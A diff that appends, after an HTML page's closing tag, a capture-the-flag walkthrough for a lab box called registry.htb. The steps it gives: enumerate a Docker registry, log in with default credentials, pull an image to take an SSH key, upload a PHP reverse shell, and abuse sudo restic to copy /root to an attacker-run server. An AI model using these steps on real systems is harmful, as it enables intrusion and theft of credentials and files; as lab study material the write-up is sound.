@@ -39,3 +39,59 @@
             integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
     </body>
 </html>
+## USER 
+
+added docker.registry.htb to hosts 
+and starget gobuster against https on port 443
+
+fond a path to /v2
+
+and read the HTTP response header which said: 
+Docker-Distribution-Api-Version   registry/2.0
+
+it meant that this box is running docker and turned out /v2 stands for API 
+
+to get image name GET this path /v2/_catalog
+
+to make docker pull working 1st we need to setup cert which is done with this command:
+openssl s_client -showcerts -connect docker.registry.htb:443 < /dev/null | sed \
+    -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > /etc/docker/certs.d/docker.registry.htb/ca.crt
+
+      
+after that login with admin:admin
+docker login -u admin -p admin docker.registry.htb:443/bolt-image
+
+now image can be pulled:
+docker pull docker.registry.htb:443/bolt-image
+
+run it and see what's inside.
+docker run -it 601499e98a60
+
+greb the id_rsa for bolt user
+check /var/www/html/sync.sh and see that it runs without a passphrase 
+check .viminfo and find the last edited file. 
+that's the file with the pass phrase..
+
+#ROOT
+
+fond webapp in /var/www/html got admin hash from it's database and used it here:
+http://registry.htb/bolt/bolt/login 
+
+go to main configuration and allow php uploads
+using shell_exec() setup a listening nc connecion and connect to 
+the remote listener from attacker's box to get a rev shell as www-data
+
+this user can sudo a command without a password:
+sudo /usr/bin/restic backup -r rest*
+
+which means we can setup a listening restic server and backup any directory or file to our server
+fetch go server from restic-server github repo and build a binary (optionally compress it with upx -9)
+
+create a temporary dir for out new repo like this
+restic init --repo ./tmp
+
+and serv the repo: restic-server --path ./tmp --no-auth
+backup the /root dir: sudo /usr/bin/restic backup -r rest:http://localhost:8000/ /root
+restore the repo: mkdir restore && restic -r ./tmp restore latest --target ./restore
+
+rooted..
